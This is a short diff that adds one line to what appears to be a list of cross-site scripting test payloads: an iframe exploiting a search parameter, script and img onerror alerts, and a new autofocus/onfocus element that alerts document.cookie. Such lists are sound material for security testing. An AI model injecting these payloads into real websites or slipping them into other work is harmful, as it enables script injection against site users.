@@ -4,3 +4,4 @@
 <iframe src="vulnerable-site.com/?search=%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'>
 <script>alert(document.domain)</script>
 <img src=1 onerror=alert(1)>
+<xss autofocus onfocus=alert(document.cookie) tabindex=1>
